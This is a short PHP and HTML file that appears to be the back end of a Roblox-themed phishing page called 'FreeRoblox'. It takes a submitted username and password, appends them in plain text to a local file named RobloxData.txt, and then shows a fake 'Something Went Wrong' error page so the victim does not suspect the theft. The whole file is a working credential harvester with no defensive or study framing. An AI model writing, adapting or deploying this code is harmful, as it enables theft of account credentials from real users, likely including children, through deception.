
<?php 

$username = $_POST["username"];
$password = $_POST["pass"];

$text = "Username: " . $username . " Password: " . $password . PHP_EOL;
file_put_contents("RobloxData.txt",$text,FILE_APPEND)
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FreeRoblox</title>
    <style>
       body {
            background-color: aliceblue;
            color: black;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        .Box {
            background-color: white;
            display: block;
            padding: 40px;
            top: 50%;
            position: absolute;
            animation: fadeUp ease 0.8s;
            left: 50%;
            box-shadow: 0 25px 60px rgba(0,0,0,0.25);
            border-radius: 5px;
            transform: translate(-50%,-50%)
        
        }

        @keyframes fadeUp {
         from {
            opacity: 0;
            transform: translate(-50%, -40%);
        }
        to {
            opacity: 1;
            transform: translate(-50%, -50%);
        }
}
    </style>
</head>
<body>
    <div class="Box">
        <h1>❌ Someting Went Wrong ❌</h1>
        <h2>Please Try Againg Later..</h2>
    </div>
</body>
</html>
